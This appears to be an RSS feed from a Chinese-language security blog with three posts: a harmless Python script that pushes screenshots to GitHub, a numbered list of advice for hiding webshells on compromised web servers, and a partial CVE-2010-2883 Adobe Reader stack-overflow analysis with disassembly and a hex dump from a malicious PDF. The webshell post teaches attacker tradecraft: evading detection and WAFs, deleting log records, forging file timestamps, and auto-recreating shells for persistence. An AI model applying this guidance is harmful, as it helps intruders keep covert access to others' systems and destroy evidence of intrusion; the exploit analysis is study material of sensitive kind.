<?xml version="1.0" encoding="UTF-8"?>
<rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom">
  <channel>
    <title>quanyechavshuo</title>
    <description>A blog about programming and network security</description>
    <link>/</link>
    <atom:link href="/feed.xml" rel="self" type="application/rss+xml" />
    <pubDate>Sat, 30 Jul 2016 17:39:28 +0800</pubDate>
    <lastBuildDate>Sat, 30 Jul 2016 17:39:28 +0800</lastBuildDate>
    <generator>Jekyll v3.1.2</generator>
    
      <item>
        <title>自动上传截图至github并获取uri</title>
        <description>&lt;h3 id=&quot;x00-about&quot;&gt;0x00 about&lt;/h3&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;目的:实现一个自动将截图上传至github并获取对应uri
用途:方便博客md文件中截图的处理
使用方法:
    初次运行时,在linxu系统中新建/root/githubpic目录,并将github上对应的图片目录下载到本地
    以后运行时,将需要上传的图片人工拷贝到/root/githubpic目录,运行该脚本可实现自动将新图片上传并获取uri
快捷运行：
    cp mysnippingtool.py /usr/share
    vi ~/.zshrc
    +alias jt=&quot;python /usr/share/mysnippingtool.py&quot;
&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;

&lt;h3 id=&quot;x01-code&quot;&gt;0x01 code&lt;/h3&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;c&quot;&gt;# -*- coding: utf-8 -*-&lt;/span&gt;
&lt;span class=&quot;kn&quot;&gt;import&lt;/span&gt; &lt;span class=&quot;nn&quot;&gt;sys&lt;/span&gt;
&lt;span class=&quot;nb&quot;&gt;reload&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;sys&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
&lt;span class=&quot;n&quot;&gt;sys&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;setdefaultencoding&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&#39;utf-8&#39;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
&lt;span class=&quot;c&quot;&gt;#必须加上上面四行,否则各种编码的错误爆出&lt;/span&gt;

&lt;span class=&quot;kn&quot;&gt;import&lt;/span&gt; &lt;span class=&quot;nn&quot;&gt;os&lt;/span&gt;

&lt;span class=&quot;n&quot;&gt;tmp&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;
&lt;span class=&quot;n&quot;&gt;all_file_name_list&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[]&lt;/span&gt;
&lt;span class=&quot;k&quot;&gt;def&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;get_all_file_name&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;folder&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;):&lt;/span&gt;
    &lt;span class=&quot;k&quot;&gt;global&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;tmp&lt;/span&gt;
    &lt;span class=&quot;k&quot;&gt;global&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;root_dir&lt;/span&gt;
    &lt;span class=&quot;k&quot;&gt;global&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;all_file_name_list&lt;/span&gt;
    &lt;span class=&quot;n&quot;&gt;tmp&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;+=&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;
    &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;tmp&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;==&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;
        &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;folder&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;==&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&#39;/&#39;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;
            &lt;span class=&quot;n&quot;&gt;root_dir&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;folder&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[:&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt;
        &lt;span class=&quot;k&quot;&gt;else&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;
            &lt;span class=&quot;n&quot;&gt;root_dir&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;folder&lt;/span&gt;

    &lt;span class=&quot;n&quot;&gt;allfile&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;os&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;listdir&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;folder&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
    &lt;span class=&quot;k&quot;&gt;for&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;each&lt;/span&gt; &lt;span class=&quot;ow&quot;&gt;in&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;allfile&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;
        &lt;span class=&quot;n&quot;&gt;each_abspath&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;os&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;path&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;join&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;folder&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;each&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
        &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;os&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;path&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;isdir&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;each_abspath&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;):&lt;/span&gt;
            &lt;span class=&quot;n&quot;&gt;get_all_file_name&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;each_abspath&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
        &lt;span class=&quot;k&quot;&gt;else&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;
            &lt;span class=&quot;c&quot;&gt;#print each_abspath&lt;/span&gt;
            &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;len&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;each_abspath&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;len&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;root_dir&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;+&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;+&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;len&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;os&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;path&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;basename&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;each&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)):&lt;/span&gt;
                &lt;span class=&quot;n&quot;&gt;filename&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;each_abspath&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;len&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;root_dir&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;+&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:]&lt;/span&gt;
                &lt;span class=&quot;c&quot;&gt;#print filename&lt;/span&gt;
                &lt;span class=&quot;n&quot;&gt;all_file_name_list&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;append&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;filename&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
            &lt;span class=&quot;k&quot;&gt;else&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;
                &lt;span class=&quot;c&quot;&gt;#print each&lt;/span&gt;
                &lt;span class=&quot;n&quot;&gt;all_file_name_list&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;append&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;each&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;

    &lt;span class=&quot;k&quot;&gt;return&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;all_file_name_list&lt;/span&gt;


&lt;span class=&quot;k&quot;&gt;def&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;main&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;():&lt;/span&gt;
    &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;os&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;path&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;exists&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&#39;/root/githubpic&#39;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;ow&quot;&gt;is&lt;/span&gt; &lt;span class=&quot;bp&quot;&gt;False&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;
        &lt;span class=&quot;k&quot;&gt;print&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;this is the first time you use me,or you have deleted /root/githubpic,I will mkdir /root/githubpic and git pull the github&#39;s pic.git,please put pngs to /root/githubpic when needed,and don&#39;t delet any png file in this folder&quot;&lt;/span&gt;
        &lt;span class=&quot;n&quot;&gt;os&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;system&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;mkdir /root/githubpic &amp;amp;&amp;amp; cd /root/githubpic &amp;amp;&amp;amp; git init &amp;amp;&amp;amp; git pull https://github.com/3xp10it/pic.git &amp;amp;&amp;amp; git remote add origin https://github.com/3xp10it/pic.git &amp;amp;&amp;amp; git status&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;

    &lt;span class=&quot;n&quot;&gt;os&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;system&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;cd /root/githubpic &amp;amp;&amp;amp; git add . &amp;amp;&amp;amp; git status &amp;amp;&amp;amp; git commit -a -m &#39;update&#39; &amp;amp;&amp;amp; git push -u origin master&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;

    &lt;span class=&quot;n&quot;&gt;all_png_list&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;get_all_file_name&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;/root/githubpic&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;

    &lt;span class=&quot;k&quot;&gt;for&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;each&lt;/span&gt; &lt;span class=&quot;ow&quot;&gt;in&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;all_png_list&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;
        &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;each&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;3&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:]&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;==&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&#39;png&#39;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;
            &lt;span class=&quot;k&quot;&gt;try&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;
                &lt;span class=&quot;n&quot;&gt;f&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;open&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;/root/githubpic/address.txt&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;a+&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
                &lt;span class=&quot;nb&quot;&gt;all&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;f&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;readlines&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;()&lt;/span&gt;
                &lt;span class=&quot;n&quot;&gt;each_addr&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;https://raw.githubusercontent.com/3xp10it/pic/master/&lt;/span&gt;&lt;span class=&quot;si&quot;&gt;%&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;s&quot;&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;%&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;each&lt;/span&gt;
                &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;each_addr&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;+&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&#39;&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\r\n&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&#39;&lt;/span&gt; &lt;span class=&quot;ow&quot;&gt;not&lt;/span&gt; &lt;span class=&quot;ow&quot;&gt;in&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;all&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;
                    &lt;span class=&quot;k&quot;&gt;print&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;each_addr&lt;/span&gt;
                    &lt;span class=&quot;n&quot;&gt;f&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;write&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;each_addr&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;+&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&#39;&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\r\n&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&#39;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
                    &lt;span class=&quot;n&quot;&gt;f&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;close&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;()&lt;/span&gt;
            &lt;span class=&quot;k&quot;&gt;except&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;
                &lt;span class=&quot;k&quot;&gt;print&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;open /root/githubpic/address.txt wrong&quot;&lt;/span&gt;

&lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;__name__&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;==&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&#39;__main__&#39;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;
    &lt;span class=&quot;n&quot;&gt;main&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;()&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;

&lt;h3 id=&quot;x02-attention&quot;&gt;0x02 attention&lt;/h3&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;os.path.abspath()函数的问题

print os.path.abspath(each) is not good function,
it will get /root/桌面/spider_wooyun when I put this py script file in /root/桌面,and run:
(cd 桌面)
python mysnippingtool.py
it will get &quot;/root/桌面/spider_wooyun&quot; as a result,but the true result should be &quot;/root/githubpic/spider_wooyun&quot;
so I use:
        each_abspath=os.path.join(folder,each)
to get the current file&#39;s abspath

&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;

&lt;p&gt;&lt;a href=&quot;https://raw.githubusercontent.com/3xp10it/little_scripts/master/mysnippingtool.py&quot;&gt;&lt;small&gt;代码链接&lt;/small&gt;&lt;/a&gt;&lt;/p&gt;

</description>
        <pubDate>Sat, 30 Jul 2016 00:00:00 +0800</pubDate>
        <link>/jekyll/2016/07/30/%E8%87%AA%E5%8A%A8%E4%B8%8A%E4%BC%A0%E6%88%AA%E5%9B%BE%E8%87%B3github/</link>
        <guid isPermaLink="true">/jekyll/2016/07/30/%E8%87%AA%E5%8A%A8%E4%B8%8A%E4%BC%A0%E6%88%AA%E5%9B%BE%E8%87%B3github/</guid>
        
        <category>github</category>
        
        <category>python</category>
        
        <category>文件遍历</category>
        
        
        <category>jekyll</category>
        
      </item>
    
      <item>
        <title>隐藏webshell的几条建议</title>
        <description>&lt;p&gt;knowledge from klion&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;关于如何更好的隐藏webshell的几点建议:

1,尽量藏在那些程序员和管理员都不会经常光顾的目录中
比如:第三方工具的一些插件目录,主题目录,编辑器的图片目录以及一些临时目录

2,目录层级越深越好,平时网站不出问题的话,一般四五级目录很少会被注意到

3,webshell的名字千万不要太扎眼,比如:hack.php,sb.php,x.php这样的名字严禁出现……,在给webshell起名的时候尽量跟当前目录的,其他文件的名字相似度高一点,这样相对容易混淆视听,比如:目录中有个叫new.php的文件,那你就起个news.php

4,webshell里面尽量不要用类似eval这种过于敏感的特征,因为awk一句话就能查出来,除了eval,还有,比如:exec,system,passthru,shell_exec,assert这些函数都最好不要用,你可以尝试写个自定义函数,不仅能在一定程度上延长webshell的存活时间也加大了管理员的查找难度,也可以躲避一些功能比较简陋waf查杀,此外,我们也可以使用一些类似:call_user_func,call_user_func_array,诸如此类的回调函数特性来构造我们的webshell,即伪造正常的函数调用

5,靠谱的方法就是直接把一句话插到正常的网站脚本文件里面,当然最好是在一个不起眼的地方,比如:函数库文件,配置文件里面等等,以及那些不需要经常改动的文件……

6,再或者拿到权限以后,把网站日志中的所有关于webshell的访问记录和渗透时造成的一些网站报错记录全部删除

7,尝试利用静态文件隐藏一句话,然后用.htaccess 规则进行解析

8,把webshell的属性时间改为和同目录文件相同的时间戳,比如linux中的touch就是非常好的工具

9,当然,如果在拿到服务器权限以后,也可以自己写个脚本每隔一段时间检测下自己的webshell是否还存在,不存在就创建

10,利用php.ini 配置文件隐藏webshell,把webshell的路径加入到配置文件中

11,如果是大马的话,尽量把里面的一些注释和作者信息全部都去掉,比如intitle字段中的版本信息等等,用任何大马之前最好先好好的读几遍代码,把里面的shell箱子地址全部去掉推荐用开源的大马,然后自己拿过来仔细修改,记住,我们的webshell尽量不要用加密,因为加密并不能很好的解决waf问题,还有,大马中一般都会有个pass或者password字符,建议把这些敏感字段全部换成别的,因为利用这样的字符基本一句话就能定位到

12,养成一个好习惯,为了防止权限很快丢失,最好再同时上传几个备用webshell,注意,每个webshell的路径和名字千万不要都一样更不要在同一个目录下,多跳几层,记住,确定shell正常访问就可以了,不用再去尝试访问看看解析是否正常,因为这样就会在日志中留下记录,容易被查到

13,在有权限的情况,看看管理员是否写的有动态webshell监测脚本,务必把脚本找出来,crontab一般都能看见了

14,上传个精心构造的图片马,然后再到另一个不起眼的正常的网站脚本文件中去包含这个图片马

15,如果有可能的话,还是审计下目标的代码,然后想办法在正常的代码中构造执行我们自己的webshell,即在原生代码中执行webshell

16,我这里只是根据个人经验总结了一些比较常用的,当然,肯定还有更多更好更高级的关于webshell的隐藏方法,欢迎大家一起交流,待续……
&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;
</description>
        <pubDate>Thu, 28 Jul 2016 00:00:00 +0800</pubDate>
        <link>/webshell/2016/07/28/%E9%9A%90%E8%97%8Fwebshell/</link>
        <guid isPermaLink="true">/webshell/2016/07/28/%E9%9A%90%E8%97%8Fwebshell/</guid>
        
        <category>webshell</category>
        
        
        <category>webshell</category>
        
      </item>
    
      <item>
        <title>漏洞战争-cve-2010-2883</title>
        <description>&lt;p&gt;0x00 漏洞情况&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;漏洞出现在cooltype.dll文件中,由strcat调用产生栈溢出漏洞

strcat:

原型
extern char *strcat(char *dest,char *src);

用法
#include &amp;lt;string.h&amp;gt;
在C++中,则存在于&amp;lt;cstring&amp;gt;头文件中.

功能
把src所指字符串添加到dest结尾处(覆盖dest结尾处的&#39;\0&#39;).

说明
src和dest所指内存区域不可以重叠且dest必须有足够的空间来容纳src的字符串.
返回指向dest的指针.

准备工作:
1.下载adobe reader 9.3.4
神器站点:
http://www.oldapps.com/index.php
2.制作恶意pdf:
http://www.freebuf.com/vuls/80072.html
&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;

&lt;p&gt;0x01 ida对应代码&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;1.安装adobe reader9.3.4后,将cooltype.dll用ida打开

2.搜索方法:
ctrl+s
双击.text段
alt+t搜索所有&quot;SING&quot;
在9个结果中一一打开
发现第二个搜索结果为书中的关键有溢出代码处

3.具体如下:
------------------key code------------------
.text:0803DCF9
.text:0803DCF9                 push    ebp
.text:0803DCFA                 sub     esp, 104h
.text:0803DD00                 lea     ebp, [esp-4]
.text:0803DD04                 mov     eax, ___security_cookie
.text:0803DD09                 xor     eax, ebp
.text:0803DD0B                 mov     [ebp+108h+var_4], eax
.text:0803DD11                 push    4Ch
.text:0803DD13                 mov     eax, offset sub_8184A54
.text:0803DD18                 call    __EH_prolog3_catch
.text:0803DD1D                 mov     eax, [ebp+108h+arg_C]
.text:0803DD23                 mov     edi, [ebp+108h+arg_0]
.text:0803DD29                 mov     ebx, [ebp+108h+arg_4]
.text:0803DD2F                 mov     [ebp+108h+var_130], edi
.text:0803DD32                 mov     [ebp+108h+var_138], eax
.text:0803DD35                 call    sub_804172C
.text:0803DD3A                 xor     esi, esi
.text:0803DD3C                 cmp     dword ptr [edi+8], 3
.text:0803DD40                 mov     [ebp+108h+var_10C], esi
.text:0803DD43                 jz      loc_803DF00
.text:0803DD49                 mov     [ebp+108h+var_124], esi
.text:0803DD4C                 mov     [ebp+108h+var_120], esi
.text:0803DD4F                 cmp     dword ptr [edi+0Ch], 1
.text:0803DD53                 mov     byte ptr [ebp+108h+var_10C], 1
.text:0803DD57                 jnz     loc_803DEA9
.text:0803DD5D                 push    offset aName    ; &quot;name&quot;
.text:0803DD62                 push    edi             ; int
.text:0803DD63                 lea     ecx, [ebp+108h+var_124]
.text:0803DD66                 mov     [ebp+108h+var_119], 0
.text:0803DD6A                 call    sub_80217D7
.text:0803DD6F                 cmp     [ebp+108h+var_124], esi
.text:0803DD72                 jnz     short loc_803DDDD
.text:0803DD74                 push    offset aSing    ; &quot;SING&quot;
.text:0803DD79                 push    edi             ; int
.text:0803DD7A                 lea     ecx, [ebp+108h+var_12C]
.text:0803DD7D                 call    sub_8021B06
.text:0803DD82                 mov     eax, [ebp+108h+var_12C]
.text:0803DD85                 cmp     eax, esi
.text:0803DD87                 mov     byte ptr [ebp+108h+var_10C], 2
.text:0803DD8B                 jz      short loc_803DDC4
.text:0803DD8D                 mov     ecx, [eax]
.text:0803DD8F                 and     ecx, 0FFFFh
.text:0803DD95                 jz      short loc_803DD9F
.text:0803DD97                 cmp     ecx, 100h
.text:0803DD9D                 jnz     short loc_803DDC0
.text:0803DD9F
.text:0803DD9F loc_803DD9F:                            ; CODE XREF: sub_803DCF9+9Cj
.text:0803DD9F                 add     eax, 10h
.text:0803DDA2                 push    eax             ; char *
.text:0803DDA3                 lea     eax, [ebp+108h+var_108]
.text:0803DDA6                 push    eax             ; char *
.text:0803DDA7                 mov     [ebp+108h+var_108], 0
.text:0803DDAB                 call    strcat
--------------end------------------------

4.分析
a.803ddab处的call strcat的两个参数为803dda2处的eax和803dda6处的eax
b.在803dda2处下断调试容易跟踪详情
&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;

&lt;p&gt;0x02 od动态跟踪&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;1.打开reader,od附加,f9
2.ctrl+g:803dda2,f2
3.reader中打开msf.pdf
4.od中断到803dda2处,eax=046BF838,对应eax中内容如下:
------------source------------
98 66 51 E6 AB 53 8B E7 14 A7 82 4A 0C 0C 0C 0C 16 0A 12 37 7A 8C E7 36 3F DC A9 03 A1 E1 CF CB
7B 78 91 C5 8B 8C F7 5F 3D C8 2F 90 40 D3 35 1E 24 0B 45 5F 64 6D 61 0A 1D 5B 9E 6C 2E F6 6A EB
89 FB 3E CC 65 83 1A 2B D3 90 68 1B FE 63 ED DA 39 CA 41 28 86 9A 6B B3 CC 51 C7 D5 D9 2A 2C 0F
61 EF 51 B4 15 34 4C 5E CD B9 F3 26 CE 89 71 48 1F 25 37 4F AD 28 5D 90 B8 53 BA 57 1C E7 86 7D
66 9F 22 4E 05 68 C6 D0 A9 2F D9 81 BB B7 34 8C 90 E6 52 9F C1 80 F6 4C F4 16 A7 0F 3E 78 88 5C
8B 12 CE 9A 19 DF E0 D2 B2 96 F6 7F 57 B5 D4 AF E9 4D 16 7A E1 A3 B0 D3 1A 55 2C 79 CF C1 EB 45
B3 73 5F BC 48 9D 85 4D EF 49 23 6A C7 FB 64 DD 49 2C 86 5F 6D BF 61 FE E6 DC 88 03 E7 54 88 B4
